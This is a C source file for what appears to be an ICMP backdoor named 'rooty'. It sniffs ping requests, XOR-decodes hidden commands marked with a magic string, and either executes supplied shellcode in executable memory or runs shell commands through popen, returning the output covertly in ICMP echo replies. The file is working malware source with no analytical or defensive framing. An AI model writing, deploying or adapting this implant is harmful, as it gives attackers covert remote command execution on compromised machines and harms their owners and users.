#include "rooty.h"

int output_socket = 0;

int build_packet(unsigned char *pkt, const struct icmphdr *icmp_input, uint8_t *data, uint32_t size) {
	struct icmphdr *icmp = NULL;
	uint8_t *pkt_data = NULL;

	if((pkt != NULL) && (icmp_input != NULL)) {

		icmp = (struct icmphdr *)pkt;
		pkt_data = (uint8_t *)(pkt + sizeof(struct icmphdr));

		// Required ICMP fields
		icmp->type = 0;
		icmp->code = 0;
		icmp->un.echo.id = icmp_input->un.echo.id;
		icmp->un.echo.sequence = icmp_input->un.echo.sequence;
		icmp->checksum = icmp_input->checksum;

		// Copy the data into the packet
		memcpy(pkt_data, data, size);

		return (sizeof(struct icmphdr) + size);	
	}
	
	return 0;
}

void send_packet(const uint8_t *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
	uint32_t pkt_size = sizeof(struct icmphdr) + size;
	uint8_t encrypted_data[size], *key = NULL, pkt[pkt_size];
	struct sockaddr_in sin;

	// Make sure we have data
	if(size > 0) {

		// Generate the key for transmission
		key = (unsigned char *)&icmp->un.echo.sequence;

		// Encrypt the data
		if(decrypt_message(data, encrypted_data, size, key) == size) {

			// Clear out the packet
			memset(pkt, 0, pkt_size);

			// Create our packet
			if((pkt_size = build_packet(pkt, icmp, encrypted_data, size)) > 0) {

				// Fill in the sockaddr
				sin.sin_family = AF_INET;
				sin.sin_port = 0;
				sin.sin_addr.s_addr = ip->saddr;

				// Not going to worry about failures
				sendto(output_socket, pkt, pkt_size, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr_in));
			}
		}
	}
}

void run_shellcode(const unsigned char *shellcode, uint32_t size) {
	unsigned char *executable = NULL, *new_stack = NULL;
	void (*function)();
	int pid, status;
	
	// We need some more memory to work
	if(executable = mmap(NULL, size, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) {
		
		// Copy our prefix and shellcode in
		memcpy(executable, shellcode, size);

		// Set up the function pointer
		function = (void *)executable;

		// Create a new stack area for payloads that need writable/executable stack	
		if(new_stack = mmap(NULL, STACK_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) {

			// Hopefully this works
			if((pid = fork()) >= 0) {

				if(pid == 0) {

					// Some of the msfpayloads seem to eventually jump to the stack even though it's not executable
					__asm__("mov %edx,%esp");

					// Now call the shellcode
					function();

					// Make sure we exit the child cleanly
					exit(0);
				}
				else {
					waitpid(-1, &status, WNOHANG | WUNTRACED | WCONTINUED);
				}
			}
		}
	}
}

void run_command(const unsigned char *command, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
	FILE *fd = NULL;
	uint8_t cmd[size + 1], buf[MAX_PACKET_SIZE];
	uint32_t read = 0;

	// Need to copy and null terminate the command
	memset(cmd, 0, size + 1);
	memcpy(cmd, command, size);

	// Execute the command
	if((fd = popen(command, "r")) != NULL) {

		while((read = fread(buf, 1, MAX_PACKET_SIZE, fd)) > 0) {
			send_packet(buf, read, ip, icmp);
		}
	}
}

int decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint32_t size, unsigned char *key) {
	int ctr;

	for(ctr = 0; ctr < size; ctr++) {	
		decoded_data[ctr] = ((data[ctr] ^ key[0]) ^ key[1]);
	}

	return ctr;
}

void process_message(const unsigned char *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
	unsigned char decoded_data[size];
	unsigned char *key = (unsigned char *)&(icmp->un.echo.sequence);
	uint32_t data_len = 0, hdr_len = 0;
	uint8_t msg_type = 0;

	// Make sure we have data
	if(size > 0) {

		// Decrypt the message (I know right?)
		if(decrypt_message(data, decoded_data, size, key) > 0) {

			// Make sure the magic is there
			if(!strncmp(decoded_data, MAGIC, strlen(MAGIC))) {
				hdr_len = strlen(MAGIC) + 1;
				data_len = size - hdr_len;
				msg_type = data[hdr_len - 2];

				// First byte should be the message type
				switch(msg_type) {
					case MESSAGE_SHELLCODE:
						run_shellcode(decoded_data + hdr_len, data_len);
						break;
					case MESSAGE_COMMAND:
						run_command(decoded_data + hdr_len, data_len, ip, icmp);
						break;
				}
			}
		}
	}
}

void process_packet(u_char *user_data, const struct pcap_pkthdr *hdr, const u_char *pkt) {
	const struct ether_arp *ethernet = NULL;
	const struct iphdr *ip = NULL;
	const struct icmphdr *icmp = NULL;
	u_int size_ip, size_icmp;
	const unsigned char *data = NULL;

	// Ethernet
	ethernet = (struct ether_arp *)pkt;

	// IP
	ip = (struct iphdr *)(pkt + SIZE_ETHERNET);
	size_ip = ((ip->ihl & 0x0f) * 4);
	
	// ICMP
	icmp = (struct icmphdr *)(pkt + SIZE_ETHERNET + size_ip);
	size_icmp = sizeof(struct icmphdr);

	// Data
	data = (unsigned char *)(pkt + SIZE_ETHERNET + size_ip + size_icmp);

	// Only want to deal with icmp echo requests
	if((icmp->type == 8) && (icmp->code == 0)) {
		process_message(data, (hdr->len - (data - pkt)), ip, icmp);
	}
}

int main(int argc, char *argv[0]) {
	char *iface = NULL;
	pcap_t *handle = NULL;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;
	bpf_u_int32 mask, net;
	char bpf_filter[] = "icmp";

	// Did we get an interface to work with?
	if(argc != 2) {
		fprintf(stderr, "Usage: %s <iface>\n", argv[0]);
		return -1;
	}

	// Seed random for later
	srand(time(NULL));

	// Yay, we have an interface
	iface = argv[1];

	// Opening the pcap device
	if((handle = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf)) == NULL) {
		fprintf(stderr, "Error opening device %s: %s\n", iface, errbuf);
		return -1;
	}

	// Need some extra information about the network interface
	if(pcap_lookupnet(iface, &net, &mask, errbuf)) {
		fprintf(stderr, "Error getting interface information for %s: %s\n", iface, errbuf);
		return -1;
	}

	// Make sure we got information
	if((mask == 0) || (net == 0)) {
		fprintf(stderr, "Error getting interface information for %s\n", iface);
		return -1;
	}

	// We only want to see ICMP traffic
	if(pcap_compile(handle, &fp, bpf_filter, 0, mask)) {
		fprintf(stderr, "Error compiling bpf filter '%s': %s\n", bpf_filter, pcap_geterr(handle));
		return -1;
	}

	// Finally set up our filter
	if(pcap_setfilter(handle, &fp)) {
		fprintf(stderr, "Error applying bpf filter '%s': %s\n", bpf_filter, pcap_geterr(handle));
		return -1;
	}

	// Create our socket for sending responses
	if((output_socket = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) <= 0) {
		fprintf(stderr, "Error creating raw socket\n");
		return -1;
	}

	// Now we can finally sniff
	pcap_loop(handle, -1, process_packet, NULL);

	return 0;
}

